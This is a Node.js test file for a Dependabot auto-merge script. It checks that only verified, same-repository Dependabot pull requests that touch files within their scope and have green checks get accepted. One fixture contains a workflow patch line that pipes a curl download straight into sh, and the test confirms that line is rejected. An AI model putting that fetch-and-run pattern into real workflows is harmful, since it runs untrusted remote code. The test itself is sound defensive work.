import assert from "node:assert/strict";
import test from "node:test";

import {
  actionPinOnlyPatch,
  checksAreGreen,
  commitsAreTrusted,
  filesMatchDependabotScope,
  isTrustedDependabotPullRequest,
  mergeStateIsAcceptable,
  requiredChecksAreGreen,
  requiredChecksAreMissing,
} from "../dependabot-auto-merge.mjs";

const trustedPull = {
  state: "open",
  draft: false,
  user: { login: "dependabot[bot]", type: "Bot" },
  head: {
    ref: "dependabot/npm_and_yarn/hono-4.13.7",
    repo: { full_name: "Aethersailor/bark-worker" },
  },
  base: { ref: "main" },
};

test("accepts only a same-repository Dependabot pull request", () => {
  assert.equal(
    isTrustedDependabotPullRequest(trustedPull, "Aethersailor/bark-worker", "main"),
    true,
  );
  assert.equal(
    isTrustedDependabotPullRequest(
      { ...trustedPull, user: { login: "lookalike", type: "User" } },
      "Aethersailor/bark-worker",
      "main",
    ),
    false,
  );
  assert.equal(
    isTrustedDependabotPullRequest(
      {
        ...trustedPull,
        head: { ...trustedPull.head, repo: { full_name: "attacker/bark-worker" } },
      },
      "Aethersailor/bark-worker",
      "main",
    ),
    false,
  );
});

test("limits changed files to the Dependabot ecosystem scope", () => {
  assert.equal(
    filesMatchDependabotScope("dependabot/npm_and_yarn/hono-4.13.7", [
      { filename: "package.json" },
      { filename: "pnpm-lock.yaml" },
      { filename: "pnpm-workspace.yaml" },
    ]),
    true,
  );
  assert.equal(
    filesMatchDependabotScope("dependabot/github_actions/actions/checkout-8", [
      {
        filename: ".github/workflows/ci.yml",
        patch:
          "@@ -1,2 +1,2 @@\n-  uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v7\n+  uses: actions/checkout@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v8",
      },
    ]),
    true,
  );
  assert.equal(
    filesMatchDependabotScope("dependabot/npm_and_yarn/hono-4.13.7", [
      { filename: "worker/src/index.ts" },
    ]),
    false,
  );
  assert.equal(
    filesMatchDependabotScope("dependabot/github_actions/actions/checkout-8", [
      {
        filename: ".github/workflows/ci.yml",
        patch:
          "@@ -1,2 +1,2 @@\n-  uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n+  run: curl https://example.com | sh",
      },
    ]),
    false,
  );
});

test("accepts only pinned action SHA line changes", () => {
  assert.equal(
    actionPinOnlyPatch(
      "@@ -1,2 +1,2 @@\n-  uses: github/codeql-action/init@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4\n+  uses: github/codeql-action/init@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v5",
    ),
    true,
  );
  assert.equal(actionPinOnlyPatch("@@ -1 +1 @@\n-run: safe\n+run: unsafe"), false);
});

test("requires verified Dependabot commits", () => {
  assert.equal(
    commitsAreTrusted([
      {
        author: { login: "dependabot[bot]" },
        commit: { verification: { verified: true } },
      },
    ]),
    true,
  );
  assert.equal(
    commitsAreTrusted([
      {
        author: { login: "dependabot[bot]" },
        commit: { verification: { verified: false } },
      },
    ]),
    false,
  );
  assert.equal(
    commitsAreTrusted([
      {
        author: { login: "dependabot[bot]" },
        commit: { verification: { verified: true }, message: "build(deps): bump hono" },
        parents: [{ sha: "base" }],
      },
      {
        author: { login: "github-actions[bot]" },
        commit: { verification: { verified: true }, message: "Merge main into dependabot/hono" },
        parents: [{ sha: "dependency" }, { sha: "main" }],
      },
    ]),
    true,
  );
});

function successfulCheck(name, appSlug) {
  return {
    name,
    app: { slug: appSlug },
    status: "completed",
    conclusion: "success",
    completed_at: "2026-09-11T00:00:00Z",
  };
}

const requiredChecks = [
  successfulCheck("validate", "github-actions"),
  successfulCheck("analyze (javascript-typescript)", "github-actions"),
  successfulCheck("analyze (go)", "github-actions"),
  successfulCheck("CodeQL", "github-advanced-security"),
];

test("requires every expected check from the expected GitHub App", () => {
  assert.equal(checksAreGreen(requiredChecks), true);
  assert.equal(requiredChecksAreGreen(requiredChecks), true);
  assert.equal(requiredChecksAreGreen(requiredChecks.slice(0, -1)), true);
  assert.equal(
    requiredChecksAreGreen([
      ...requiredChecks,
      { ...successfulCheck("unrelated", "github-actions"), conclusion: "failure" },
    ]),
    true,
  );
  assert.equal(requiredChecksAreMissing(requiredChecks), false);
  assert.equal(requiredChecksAreMissing(requiredChecks.slice(0, -1)), true);
  assert.equal(checksAreGreen(requiredChecks, [{ state: "pending" }]), false);
  assert.equal(checksAreGreen(requiredChecks.slice(0, -1)), false);
  assert.equal(
    checksAreGreen([
      ...requiredChecks,
      successfulCheck("new-required-check", "github-actions"),
      { ...successfulCheck("lint", "github-actions"), conclusion: "failure" },
    ]),
    false,
  );
});

test("accepts only mergeable states compatible with verified checks", () => {
  assert.equal(mergeStateIsAcceptable("clean"), true);
  assert.equal(mergeStateIsAcceptable("unstable"), true);
  assert.equal(mergeStateIsAcceptable("blocked"), false);
  assert.equal(mergeStateIsAcceptable("dirty"), false);
  assert.equal(mergeStateIsAcceptable("unknown"), false);
});
